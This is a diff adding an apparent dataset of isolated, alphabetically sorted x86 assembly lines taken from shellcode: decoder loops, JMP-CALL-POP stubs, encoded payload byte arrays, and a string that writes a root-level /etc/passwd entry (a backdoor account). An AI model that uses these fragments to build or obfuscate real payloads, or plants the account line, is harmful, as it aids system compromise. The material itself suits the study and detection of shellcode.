@@ -1,0 +1,305 @@
+_egg:
+_file:
+_param:
+_start:
+add al, 0x40
+add al, 2
+add ax, bx
+add byte [esi], 2
+add byte [var], 30
+add eax, 3 \n jnz L3
+add eax, 48
+add eax, ebx
+add ebx, 0x2
+add ecx, 1
+add esi, 4
+call _myfunc
+call cont
+call decoder
+call set_argv
+call writestring
+call_decoder:
+call_shellcode:
+call_shellcode:
+call_write:
+child:
+cmp al, cl \n jne short decode \n jmp shellcode
+cmp ax, bx \n jne l3
+cmp bl, 0xaa \n je shellcode
+cmp bl, 0xbb \n je xordecode \n jmp notdecode
+cmp BYTE [esi], 0x7 \n jle lowbound
+cmp byte [esi], 0xD \n jle wrap_around
+cmp BYTE bl, [esi] \n jne loop_1
+cmp DWORD [edx], 0x636f7270 \n je while
+cycle:
+D1: \n mov bl, byte [esi]
+D2: \n not byte [esi]
+D3: \n add byte [esi], 8
+D3: \n sub byte [esi], 7
+D4: \n pop esi \n mov edi, esi
+D4: \n xor byte [esi], 0x5
+dec bl \n jz L1
+dec cl \n jns loop_dup
+dec dl \n jnz L3
+dec dl \n jz L3
+dec ebx
+dec ecx
+dec esp
+decode_pr:
+decode:
+decode:
+decoded_shellcode:
+decoder:
+decrypt:
+div ecx
+enc:
+encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
+encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
+encrypt:
+execfile:
+execute:
+F1: \n call function_1
+F1: \n cmp byte [esi], 0x1 \n jl L1 \n sub byte [esi], 0x1 \n jmp L2
+F1: \n inc esi
+F1: \n inc esi \n inc esi
+F1: \n jmp short L1
+F1: \n not cl \n inc cl
+F1: \n not cl \n inc cl
+F1: \n not cl \n inc cl
+F1: \n pop esi
+F1: \n pop esi
+F1: \n pop esi
+F1: inc edi \n jmp short L1
+format:
+formatting:
+four:
+get:
+global _start
+inc dx
+inc eax
+inc eax
+inc eax \n inc eax
+inc eax \n inc eax
+inc ecx
+inc ecx \n inc ecx
+inc edi
+inc edx
+inc edx
+inc edx \n inc edx \n inc edx \n inc edx
+inc esi
+inc esi
+inc esi
+inc esi \n inc esi
+inc esi \n jmp L2
+inc esi \n jmp short L1
+inc_dec:
+jmp data
+jmp short call_decoder
+jmp short call_shellcode
+jmp short call_write
+jmp short enc
+jmp short get
+jmp short main
+jmp short output
+jmp short shellcode
+jmp short three
+jmp two
+jnc 0x86
+jz encoded
+L4: \n call [esp]
+lea edi, [ebx+4*esi]
+lea edi, [esi + 13]
+lea edi, [esi]
+lea edi, [esi+1]
+lea esi, [esi+4]
+loop decode
+loop decode
+loop decode \n jmp edx
+loop decode \n jmp EncodedShellcode
+loop decode \n jmp Shellcode
+loop decode \n jmp short shellcode
+loop decrypt
+loop eggLoop \n jmp edi
+main_inc:
+main:
+mov [edi], al
+mov [esi], al
+mov [esi+13], al
+mov al, byte [esi]
+mov al, byte [esi]
+mov al, byte [esi+1+ebp]
+mov al, byte [esi+ecx]
+mov al, cl
+mov al, dl
+mov al, exit_call
+mov ax, [esi]
+mov ax, table[esi*4]
+mov bh, 0x12
+mov bh, 0xe2
+mov bl, [esi+ecx]
+mov bl, 0bh
+mov bl, 0xff
+mov bl, 1
+mov bl, byte [eax]
+mov bl, byte [edi]
+mov bl, byte [edi]
+mov bl, byte [esi + eax + 1]
+mov bl, byte [esi]
+mov bl, byte [esi]
+mov bl, byte [esi+ecx+1]
+mov bl, byte [esi+ecx+1]
+mov bl, byte 0eh
+mov bl, dl
+mov byte [eax], dl
+mov byte [ebx + 35], al
+mov byte [edi], bl
+mov byte [edx + eax], bl
+mov byte [edx+eax], bl
+mov byte [esi + 1], dl
+mov byte [esi], al
+mov byte [esi+10], al
+mov byte [esi+ecx], bl
+mov byte [esi+ecx], bl
+mov byte [esp], 0x0a
+mov byte [esp], 0x2e
+mov ch, 0x4
+mov cl, 0102
+mov cl, 0x3
+mov cl, al
+mov cl, byte [eax]
+mov cl, byte [esi]
+mov cl, byte_table[2]
+mov cl, len
+mov dh, 0x35
+mov dh, 0xff
+mov dl, 0x01
+mov dl, 0x20
+mov dl, 0xff
+mov dl, byte [eax + 1]
+mov dl, byte [esi + 1]
+mov dl, byte [esi]
+mov dl, byte 0ffh
+mov eax, ebx
+mov eax, edi
+mov ebp, esp
+mov ebx, [ebx+esi]
+mov ebx, 0x2
+mov ecx, ebp
+mov ecx, esp
+mov ecx, esp
+mov edi, 0x3734b117
+mov edi, 0x978cd0d0
+mov edi, ecx
+mov edi, esi
+mov edx, 78
+mov edx, esp
+mov edx, hexlen
+mov word [ecx], 2
+mul ecx
+next_cycle:
+nop
+not byte [esi]
+not word ax
+odd_number:
+pop cx
+pop edx
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi \n mov ax, [esi]
+pop esi \n mov bx, [esi]
+pop esi \n mov cx, [esi]
+popad
+push esi
+push esi \n mov ecx, esp
+retry:
+rol byte [esi], 0x1
+rol edx, 0x4
+ror byte [esi], 0x1
+ror esi, 1
+shell:
+shellcode:
+shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash'
+shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
+shellcodelen equ $-shellcode
+shift_decode:
+shl eax, 1
+shl eax, 28
+shl ebx, 8
+shl edx, 2
+shr ax, 1
+shr ax, cl
+shr bl, 4
+shr dl, 1
+shr dl, 4
+shr dx, bl \n not byte dx
+shr eax, 24
+shr eax, 28
+shr ebx, cl
+stage:
+stageaddress:
+sub ax, 13
+sub ax, 1564
+sub bl, al
+sub bl, byte [esi]
+sub byte [esi], 3 \n not byte [esi]
+sub cl, 1 \n jnz decode
+sub cl, dl
+sub cx, cx
+sub dl, al \n jns decode_pr
+sub dx, bx
+sub eax, 0x10
+sub esp, 4
+sub esp, byte 0x1
+test eax, eax \n jz socket
+test ebx, ebx \n js short l1
+test edx, edx
+xchg [ebp+16], ecx
+xor al, 0x4a
+xor ax, 0x539
+xor ax, bx
+xor ax, bx \n jz call_decoded
+xor bl, 0xBB \n jz encoded
+xor bl, 0xBB \n jz formatting
+xor bx, bx
+xor bx, bx
+xor byte [esi], 0x2c
+xor byte [esi], cl
+xor byte [esi+ecx],0x0f
+xor cl, 0x32
+xor cl, 0xAA \n jnz Next_Cycle
+xor cl, 0XAA \n jz shift_decode
+xor dl, 0xBB \n jz Next_Cycle
+xor eax, eax
+xor eax, eax \n mov al, [esi+1]
+xor eax, eax \n mov al, 2
+xor eax, eax \n push eax
+xor eax, eax \n xor ebx, ebx
+xor eax, eax \n xor ebx, ebx \n xor ecx, ecx
+xor ebp, ebp
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx \n cmp eax, ebx \n jne exit
+xor ebx, ebx \n mov bl, 0x4
+xor ebx, ebx \n push ebx
+xor ebx, ebx \n xor ecx, ecx
+xor ecx, bh
+xor ecx, ecx
+xor ecx, ecx \n cmp ebx, ecx \n jne l1
+xor ecx, ecx \n mov cl, [esi+1]
+xor ecx, ecx \n mov cl, 0x3
+xor ecx, ecx \n mov cl, 2
+xor ecx, ecx \n mov cl, 5
+xor ecx, ecx \n mul ecx
+xor edi, edi
+xor edx, ecx \n mov dl, [esi+1]
+xor edx, edx \n cmp ecx, edx \n jne l2
+xor edx, edx \n mov dl, 5
+xor zero_reg, zero_reg
